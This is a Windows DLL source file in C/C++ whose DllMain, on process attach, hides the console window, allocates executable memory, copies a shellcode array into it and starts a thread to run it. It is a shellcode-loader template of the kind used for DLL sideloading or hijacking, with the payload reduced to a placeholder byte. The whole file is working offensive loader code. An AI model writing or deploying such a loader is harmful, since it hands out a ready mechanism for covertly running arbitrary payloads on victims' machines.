#include <windows.h>

#define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)

#if BUILDING_DLL
#define DLLIMPORT __declspec(dllexport)
#else
#define DLLIMPORT __declspec(dllimport)
#endif

DWORD WINAPI LocalExecPayloadStub(LPVOID lpParameter) {
	VOID(*lpCode)() = (VOID(*)())lpParameter;
	lpCode();
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{

		HWND hwnd = GetConsoleWindow();
		ShowWindow(hwnd, 0);

		LPVOID lpvAddr;
		HANDLE  hHand;
		DWORD dwWaitResult;
		DWORD threadID;

		unsigned char shellcode[] =
			"\xfc";

		lpvAddr = VirtualAlloc(NULL, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		RtlMoveMemory(lpvAddr, shellcode, sizeof shellcode);
		hHand = CreateThread(NULL, 0, LocalExecPayloadStub, lpvAddr, 0, &threadID);

		//dwWaitResult = WaitForSingleObject(hHand,INFINITE);

		break;
	}
	case DLL_PROCESS_DETACH:
	{
		break;
	}

	case DLL_THREAD_ATTACH:
	{
		break;
	}
	case DLL_THREAD_DETACH:
	{
		break;
	}
	}
	return TRUE;
}
